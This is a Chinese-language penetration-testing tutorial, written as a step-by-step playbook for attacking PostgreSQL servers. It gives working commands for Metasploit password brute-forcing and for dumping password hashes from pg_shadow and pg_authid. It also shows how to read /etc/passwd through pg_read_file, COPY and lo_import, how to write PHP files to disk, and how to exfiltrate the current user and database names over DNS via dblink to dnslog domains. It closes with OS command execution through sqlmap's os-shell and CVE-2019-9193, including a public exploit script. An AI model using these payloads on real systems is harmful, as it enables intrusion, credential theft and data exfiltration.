命令行连接方式

安装客户端

```bash
apt install postgresql-client
```

连接方式

```bash
psql -U postgres -p port -h ip -W -d postgres
```

-U 指定用户名

-d 指定连接的数据库，postgresql连接必须指定数据库

-h 远程连接ip

-p 远程连接端口

-W 指定终端提示符下输入密码

## Postgresql攻击方式

## Postgresql口令爆破

msf模块 auxiliary/scanner/postgres/postgres_login

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0046bf52890.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7266d9360567.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fce343e40af.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0fafbe1d9858.png)

你的暴力破解**整体完成了**

找到了 **1 组有效的账号密码**

Metasploit 提示你可以用这组凭据创建一个 Postgres 会话（连接）

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png)

## Postgresql信息收集

使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集

```sql
-- 详细信息 
select version();
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png)

```sql
-- 版本信息 
show server_version;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png)

```sql
select pg_read_file('PG_VERSION', 0, 200);
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png)

```sql
-- 数字版本信息包括小版号 
SHOW server_version_num;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png)

```sql
SELECT current_setting('server_version_num');
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png)

```sql
-- 获取 pgsql 安装目录 
select setting from pg_settings where name = 'data_directory'; 
-- 查找 pgsql 配置文件路径 
select setting from pg_settings where name='config_file' 
-- 列出数据库 
SELECT datname FROM pg_database; 
-- 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） 
select inet_server_addr();
-- 查看当前用户是不是管理员权限 on 代表是, off 代表不是 
SELECT current_setting('is_superuser'); 
-- 查询密码（印证了之前的说法 postgres用户没有设置密码） 
SELECT usename, passwd FROM pg_shadow; 
SELECT rolname,rolpassword FROM pg_authid;
-- 查询当前的加密方式 
SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
```

## Postgresql读文件

## pg_read_file

```sql
select pg_read_file('/etc/passwd'); 
select/**/PG_READ_FILE($$/etc/passwd$$);
```

```
在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
```

## copy_from

copy有两个命令：COPY FROM和COPY TO。

COPY TO用于把一个表的内容复制到一个文件；COPY FROM用于从文件复制数据到表中。

COPY TO中也可以指定查询，将查询结果写入文件。COPY FROM中文件的字段按照顺序写入到

指定列中。

```sql
DROP TABLE IF EXISTS testf0x; 
create table testf0x(t TEXT); 
copy testf0x from '/etc/passwd'; 
select * from testf0x;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ca53e7158a57.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/add833dbfab5.webp)

## lo_import

lo_import 是 PostgreSQL 内置函数，把服务器端文件导入为一个大对象（Large Object），存到系统表

pg_largeobject 里。第二个参数 12345678 是手动指定的 OID（对象标识符），方便后续引用。执行完后

/etc/passwd的内容就被存进数据库了。

```sql
select lo_import('/etc/passwd',12345678); 
-- 直接读取 
select convert_from(lo_get(12345678), 'UTF8'); 
-- 报错带出 
select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a; 
-- 删除对象 
select lo_unlink(12345678);
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a3d62f5cdb38.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07838b4e020d.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/65eeceae1f83.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3481fa22cb33.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/38135be4fdd9.png)

## msf模块 auxiliary/admin/postgres/postgres_readfile

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/760a1db06a01.webp)

## Postgresql写文件

## copy命令

```sql
COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/45372af5408f.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cddbc08d4d29.webp)

```sql
--遇到特殊字符也可以采用编码的方式写入 
COPY (select convert_from(decode('PD9waHAgcGhwaW5mbygpOz8+','base64'),'utf-8')) to '/tmp/2.php';
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f9ac237e49d4.png)

## lo_export命令

采用大对象 OID 和路径，将文件写入路径。

```sql
SELECT lo_from_bytea(12349,'<?php phpinfo();?>');
```

```sql
SELECT lo_export(12349, '/tmp/3.php');
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07caa8eeba19.png)

```sql
-- base64 的形式 
SELECT lo_from_bytea(12350,decode('PD9waHAgcGhwaW5mbygpOz8+','base64')); 
SELECT lo_export(12350, '/tmp/4.php');
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/77d68f2d04cd.png)

## lo_export + pg_largeobject

这是 PostgreSQL 利用大对象写文件的另一种手法，跟 lo_from_bytea 思路一样，但更底层，直接操作 pg_largeobject 系统表。

```sql
-- 第一步，创建一个空的大对象，记下生成的lo_creat ID 
SELECT lo_creat(-1); 
-- 第二步，往大对象里写数据，替换 24577 为生成的lo_creat ID 
INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0,decode('ZmZmZmZmZmYweA==', 'base64')); 
-- 第三步，导出到服务器文件系统： 
select lo_export(24577, '/tmp/success.txt');
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6b0eb21181f2.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b3b5d49698b.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81f637572904.webp)

## Postgresql带外数据

简单说就是：当你没法直接在查询结果里看到数据（比如盲注、无回显）时，通过**让数据库主动和你的服务器通信**，把数据 “带出来” 的一种攻击 / 利用技术。

```sql
-- 开启 dblink 扩展 
CREATE EXTENSION dblink; 
-- 获取当前数据库用户名称 
SELECT * FROM dblink('host='||(select user)||'.djw0pg.dnslog.cn user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

把原来的 `djw0pg.dnslog.cn` 换成你自己的 https://dig.pm/ 域名，同时把要带出的数据拼到前面：

## 示例：带出当前用户名

```sql
SELECT * FROM dblink('host=' || (select user) || '.你的ID.dig.pm user=test dbname=test','SELECT version()') RETURNS (result TEXT);
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3404364ff9d1.webp)

```sql
SELECT * FROM dblink('host='||(select user)||'.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

在无回显 / 盲注场景里非常关键，目标 PostgreSQL 服务器**成功发起了 DNS 请求，把你要查询的数据拼进了域名里，平台也成功收到了。**

## 示例：带出当前数据库名

```sql
SELECT * FROM dblink('host='||(SELECT current_database())||'.6fce4fca32.ddns.bypass.eu.org. user=test dbname=test', 'SELECT version()') RETURNS (result TEXT);
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/08b815fec179.webp)

这边数据库名和用户名一样

## Postgresql命令执行

如果postgres服务账户具备/tmp目录的写入权限，那么我们可以通过用户自定义函数(UDF，

user defined functions)实现任意代码执行。

## 使用sqlmap进行udf提权

```bash
sqlmap -d "PostgreSQL://postgres:postgres@10.3.4.52:5432/postgres" --os-shell
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/88c1b52c1e53.webp)

## 使用msf模块 exploit/linux/postgres/postgres_payload

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e1a582009c8d.webp)

## Postgresql CVE-2019-9193

从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令

```sql
DROP TABLE IF EXISTS cmd_exec; 
CREATE TABLE cmd_exec(cmd_output text); 
COPY cmd_exec FROM PROGRAM 'id'; 
SELECT * FROM cmd_exec;
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/119432afb813.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a71e3de44148.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f60a180f7cb0.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2577d0904a49.png)

**github脚本 https://github.com/b4keSn4ke/CVE-2019-9193**

```bash
python3 cve-2019-9193.py -i <target_ip> -p <target_port> -U <username> -P <passwd> -c <command>
```

```bash
python3 cve-2019-9193.py -i 10.3.4.84 -p 5432 -U postgres -P postgres -d template1 -c 'whoami'
```

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0eb654a1dcd.png)
